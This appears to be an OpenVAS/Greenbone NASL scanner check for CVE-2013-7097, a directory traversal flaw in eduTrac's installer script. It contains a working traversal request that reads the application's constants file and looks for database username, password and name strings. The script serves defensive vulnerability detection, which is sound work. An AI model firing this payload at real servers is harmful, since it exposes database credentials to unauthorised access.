if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804198" );
	script_version( "2020-10-29T15:35:19+0000" );
	script_cve_id( "CVE-2013-7097" );
	script_bugtraq_id( 64255 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-10-29 15:35:19 +0000 (Thu, 29 Oct 2020)" );
	script_tag( name: "creation_date", value: "2014-01-22 16:29:04 +0530 (Wed, 22 Jan 2014)" );
	script_name( "7Media Web Solutions EduTrac Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with 7Media Web Solutions EduTrac is prone to
  directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it
  is able to read the system file or not." );
	script_tag( name: "insight", value: "A flaw exists due to insufficient filtration of 'showmask' HTTP GET parameter
  passed to 'overview.php' script." );
	script_tag( name: "impact", value: "Successful exploitation may allow an attacker to obtain sensitive information,
  which can lead to launching further attacks." );
	script_tag( name: "affected", value: "7Media Web Solutions eduTrac before version 1.1.2" );
	script_tag( name: "solution", value: "Upgrade to 7Media Web Solutions eduTrac version 1.1.2 or later." );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23190" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124653/eduTrac-1.1.1-Stable-Path-Traversal.html" );
	script_category( ACT_GATHER_INFO );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.7mediaws.org/products/edutrac/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
edu_port = http_get_port( default: 80 );
if(!http_can_host_php( port: edu_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/eduTrac", "/trac", http_cgi_dirs( port: edu_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: edu_port );
	if(rcvRes && IsMatchRegexp( rcvRes, "Powered by.*eduTrac" )){
		url = dir + "/installer/overview.php?step=writeconfig&showmask=" + "../../eduTrac/Config/constants.php";
		if(http_vuln_check( port: edu_port, url: url, pattern: "DB_PASS', '", extra_check: make_list( "DB_USER', '",
			 "DB_NAME', '" ) )){
			report = http_report_vuln_url( port: edu_port, url: url );
			security_message( port: edu_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

